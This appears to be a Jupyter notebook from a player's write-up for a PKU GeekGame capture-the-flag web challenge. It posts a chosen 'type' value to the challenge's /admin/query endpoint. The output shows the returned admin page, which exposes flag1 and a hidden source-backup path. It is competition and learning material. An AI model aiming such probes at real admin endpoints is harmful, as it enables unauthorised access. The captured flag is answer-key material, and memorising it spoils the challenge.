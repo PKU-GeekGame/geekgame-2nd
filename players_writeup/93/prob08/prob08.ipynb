{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<head>\n",
      "  <meta charset=\"utf-8\">\n",
      "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n",
      "  <meta name=\"description\" content=\"\">\n",
      "  <meta name=\"author\" content=\"\">\n",
      "  <title>Admin</title>\n",
      "  <link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css\" rel=\"stylesheet\" crossorigin=\"anonymous\">\n",
      "  <link href=\"https://getbootstrap.com/docs/4.0/examples/signin/signin.css\" rel=\"stylesheet\" crossorigin=\"anonymous\"/>\n",
      "</head>\n",
      "<body>\n",
      "<div class=\"container\">\n",
      "  <form class=\"form-signin\" method=\"post\" action=\"/admin/query\">\n",
      "    <h2 class=\"form-signin-heading\">PKU GeekGame 2.0</h2>\n",
      "    <p>\n",
      "      <select name=\"type\" class=\"custom-select d-block w-100\" placeholder=\"请选择\" required autofocus>\n",
      "        <option value=\"none\" selected disabled hidden>请选择选项</option>\n",
      "        <option value=\"PKU\" name=\"type\">PKU</option>\n",
      "        <option value=\"PKUGame\" name=\"type\">PKUGame</option>\n",
      "        <option value=\"PKU_GeekGame\" name=\"type\" selected=\"selected\">PKU_GeekGame</option></option>\n",
      "      </select>\n",
      "    </p>\n",
      "    <p>\n",
      "      <label for=\"value\" class=\"sr-only\">Value</label>\n",
      "      <input type=\"text\" id=\"value\" class=\"form-control\" placeholder=\"Value\" required autofocus name=\"value\" value=\"{&quot;type&quot;:&quot;PKU_GeekGame&quot;,&quot;value&quot;:&quot;flag1{8a97cd0b-adec-4e63-bd46-3e6c60ea9d78} 恭喜你发现flag1，还有其他flag等待你发现哦&quot;}\">\n",
      "    </p>\n",
      "    <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">Click</button>\n",
      "  </form>\n",
      "<!--  <p> Source Code Backup: /admin/source_bak </p>-->\n",
      "</div>\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "url = 'http://prob08-z2a57fsd.geekgame.pku.edu.cn/admin/query/'\n",
    "d = {'type': 'PKU_GeekGame', \"value\":''}\n",
    "r = requests.post(url, data=d)\n",
    "print(r.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.7 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "dc3f1394fa3b5a2a76fb42d787780380ac2d0683c378aa72240c6a1c5e40ffd4"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
